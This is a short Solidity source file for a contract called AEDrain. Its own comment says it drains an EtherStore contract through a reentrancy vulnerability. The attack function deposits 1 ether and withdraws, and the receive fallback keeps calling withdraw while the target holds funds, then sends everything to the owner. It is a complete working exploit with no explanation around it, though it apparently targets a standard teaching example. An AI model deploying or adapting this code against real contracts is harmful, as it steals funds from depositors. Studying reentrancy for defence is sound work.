//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface EtherStore {
    function deposit() external payable;
    function withdraw() external;
}

/// @title AEDrain
/// @notice This contract is used to drain the EtherStore contract through a Reentrancy vulnerability

contract AEDrain {
    EtherStore public etherStore;
    address public owner;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Deposit gt 1 ether to AEDrain EtherStore");

        etherStore.deposit{value: 1 ether}();

        etherStore.withdraw();
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
